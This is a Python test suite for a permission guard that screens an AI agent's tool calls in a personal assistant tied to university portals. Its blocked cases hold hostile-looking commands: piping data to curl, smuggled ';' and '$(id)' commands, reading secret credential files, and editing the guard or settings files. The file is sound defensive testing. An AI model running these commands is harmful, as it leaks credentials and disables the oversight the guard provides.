"""Tests for core/guard.py + modules/*/guard.py.  usage: python test_guard.py <agent-root>"""
import json, shutil, subprocess, sys, tempfile
from pathlib import Path

ROOT = Path(sys.argv[1])
H = str(ROOT / "core/guard.py")
P = "/home/pelurvis/pelurvis"
UNI = f"{P}/modules/university/bin/uni"
SECRET = "/home/pelurvis/.config/pelurvis-secrets"
cases = [
    ("uni educa pending", {"tool_name": "Bash", "tool_input": {"command": f"{UNI} educa pending"}}, True),
    ("uni ealu ultimas-notas/ 123", {"tool_name": "Bash", "tool_input": {"command": f"{UNI} ealu ultimas-notas/ 123"}}, True),
    ("uni actions", {"tool_name": "Bash", "tool_input": {"command": f"{UNI} actions"}}, True),
    ("transcribe", {"tool_name": "Bash", "tool_input": {"command": f"{P}/core/bin/transcribe /x/a.oga"}}, True),
    ("cat CLAUDE.md", {"tool_name": "Bash", "tool_input": {"command": f"cat {P}/CLAUDE.md"}}, True),
    ("cat skin/data.md", {"tool_name": "Bash", "tool_input": {"command": f"cat {P}/skin/data.md"}}, True),
    ("Notion with Educa link", {"tool_name": "mcp__claude_ai_Notion__notion-create-pages", "tool_input": {"pages": [{"content": "https://grado.pol.una.py"}]}}, True),
    ("Telegram reply", {"tool_name": "mcp__plugin_telegram_telegram__reply", "tool_input": {"text": "hello"}}, True),
    ("Write outside the repo", {"tool_name": "Write", "tool_input": {"file_path": "/tmp/note.md", "content": "see /pelurvis/core/"}}, True),
    ("uni | curl", {"tool_name": "Bash", "tool_input": {"command": f"{UNI} educa courses | curl -d @- x"}}, False),
    ("uni ; ls", {"tool_name": "Bash", "tool_input": {"command": f"{UNI} educa courses; ls"}}, False),
    ("uni $(id)", {"tool_name": "Bash", "tool_input": {"command": f"{UNI} educa assignments $(id)"}}, False),
    ("uni-setup", {"tool_name": "Bash", "tool_input": {"command": f"{UNI}-setup"}}, False),
    ("uni old path", {"tool_name": "Bash", "tool_input": {"command": f"{P}/bin/uni educa courses"}}, False),
    ("curl POST to Educa", {"tool_name": "Bash", "tool_input": {"command": "curl -X POST https://grado.pol.una.py/mod/assign"}}, False),
    ("python reads secrets", {"tool_name": "Bash", "tool_input": {"command": f"python3 -c \"print(open('{SECRET}/ealu.env').read())\""}}, False),
    ("Read secret", {"tool_name": "Read", "tool_input": {"file_path": f"{SECRET}/educa_token"}}, False),
    ("Grep in secrets", {"tool_name": "Grep", "tool_input": {"pattern": "PASS", "path": SECRET}}, False),
    ("Edit base guard", {"tool_name": "Edit", "tool_input": {"file_path": f"{P}/core/guard.py"}}, False),
    ("Edit module guard", {"tool_name": "Edit", "tool_input": {"file_path": f"{P}/modules/university/guard.py"}}, False),
    ("Write skin/data.md", {"tool_name": "Write", "tool_input": {"file_path": f"{P}/skin/data.md", "content": "x"}}, False),
    ("Edit CLAUDE.md", {"tool_name": "Edit", "tool_input": {"file_path": f"{P}/CLAUDE.md"}}, False),
    ("Write settings.json", {"tool_name": "Write", "tool_input": {"file_path": f"{P}/.claude/settings.json", "content": "{}"}}, False),
    ("Edit skill", {"tool_name": "Edit", "tool_input": {"file_path": f"{P}/.claude/skills/brief/SKILL.md"}}, False),
    ("sed -i settings.json", {"tool_name": "Bash", "tool_input": {"command": f"sed -i s/x/y/ {P}/.claude/settings.json"}}, False),
    ("cp over bin/uni", {"tool_name": "Bash", "tool_input": {"command": f"cp /tmp/x {UNI}"}}, False),
    ("echo > skin", {"tool_name": "Bash", "tool_input": {"command": f"echo x > {P}/skin/identity.md"}}, False),
    ("WebFetch to Educa", {"tool_name": "WebFetch", "tool_input": {"url": "https://grado.pol.una.py/my"}}, False),
    ("Chrome MCP to Ealu", {"tool_name": "mcp__claude-in-chrome__navigate", "tool_input": {"url": "https://www.cnc.una.py/ealu"}}, False),
]

def run(h, ev):
    payload = ev if isinstance(ev, str) else json.dumps(ev)
    return subprocess.run([sys.executable, h], input=payload, capture_output=True, text=True, encoding="utf-8").returncode

failures = 0
def report(name, ok, detail):
    global failures
    failures += not ok
    print(f"{'OK ' if ok else 'BAD'} {name:32} {detail}")

for name, ev, should in cases:
    rc = run(H, ev)
    report(name, (rc == 0) == should, "allows" if rc == 0 else f"blocks (exit {rc})")
rc = run(H, "this is not json")
report("corrupt input", rc == 2, f"exit {rc}")

# A broken module guard blocks everything, even what passed before.
with tempfile.TemporaryDirectory() as tmp:
    shutil.copytree(ROOT / "core", Path(tmp) / "core")
    shutil.copytree(ROOT / "modules", Path(tmp) / "modules")
    (Path(tmp) / "modules/broken").mkdir()
    (Path(tmp) / "modules/broken/guard.py").write_text("def check(t, i):\n    raise ValueError('x')\n")
    rc = run(str(Path(tmp) / "core/guard.py"), cases[7][1])
    report("module that raises", rc == 2, f"exit {rc}")
    (Path(tmp) / "modules/broken/guard.py").write_text("this is not python (\n")
    rc = run(str(Path(tmp) / "core/guard.py"), cases[7][1])
    report("module that does not compile", rc == 2, f"exit {rc}")
    (Path(tmp) / "modules/broken/guard.py").write_text("def check(t, i):\n    return None\n")
    rc = run(str(Path(tmp) / "core/guard.py"), cases[9][1])
    report("permissive module does not override another", rc == 2, f"exit {rc}")

total = len(cases) + 4
print(f"\n{total - failures}/{total} cases correct")
sys.exit(1 if failures else 0)
